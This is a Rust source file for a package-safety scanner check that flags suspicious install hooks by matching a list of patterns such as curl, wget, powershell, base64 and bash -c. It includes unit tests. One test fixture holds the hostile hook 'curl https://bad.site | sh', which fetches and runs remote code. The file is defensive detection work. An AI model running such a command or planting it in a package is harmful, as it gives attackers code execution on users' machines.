use async_trait::async_trait;
use safe_pkgs_core::{
    Check, CheckExecutionContext, CheckFinding, CheckId, PackageVersion, RegistryError, Severity,
};

const CHECK_ID: CheckId = "install_script";
const SUSPICIOUS_PATTERNS: [&str; 11] = [
    "curl ",
    "wget ",
    "http://",
    "https://",
    "invoke-webrequest",
    "powershell",
    "base64",
    "eval(",
    "bash -c",
    "sh -c",
    "certutil",
];

pub fn create_check() -> Box<dyn Check> {
    Box::new(InstallScriptCheck)
}

pub struct InstallScriptCheck;

#[async_trait]
impl Check for InstallScriptCheck {
    fn id(&self) -> CheckId {
        CHECK_ID
    }

    fn description(&self) -> &'static str {
        "Flags suspicious package install hooks (preinstall/install/postinstall)."
    }

    async fn run(
        &self,
        context: &CheckExecutionContext<'_>,
    ) -> Result<Vec<CheckFinding>, RegistryError> {
        let Some(resolved_version) = context.resolved_version else {
            return Ok(Vec::new());
        };

        Ok(run(context.package_name, resolved_version)
            .await
            .into_iter()
            .collect())
    }
}

async fn run(package_name: &str, version: &PackageVersion) -> Option<CheckFinding> {
    if version.install_scripts.is_empty() {
        return None;
    }

    let suspicious = version
        .install_scripts
        .iter()
        .find(|script| is_suspicious(script));

    suspicious.map(|script| CheckFinding {
        severity: Severity::High,
        reason: format!(
            "{package_name}@{} has a suspicious install hook: {script}",
            version.version
        ),
    })
}

fn is_suspicious(script: &str) -> bool {
    let normalized = script.to_ascii_lowercase();
    SUSPICIOUS_PATTERNS
        .iter()
        .any(|pattern| normalized.contains(pattern))
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn suspicious_install_script_is_high_risk() {
        let version = PackageVersion {
            version: "1.0.0".to_string(),
            published: None,
            deprecated: false,
            install_scripts: vec!["preinstall: curl https://bad.site | sh".to_string()],
        };

        let finding = run("demo", &version).await.expect("finding");
        assert_eq!(finding.severity, Severity::High);
        assert!(finding.reason.contains("suspicious install hook"));
    }

    #[tokio::test]
    async fn no_install_scripts_returns_none() {
        let version = PackageVersion {
            version: "1.0.0".to_string(),
            published: None,
            deprecated: false,
            install_scripts: Vec::new(),
        };

        assert!(run("demo", &version).await.is_none());
    }
}
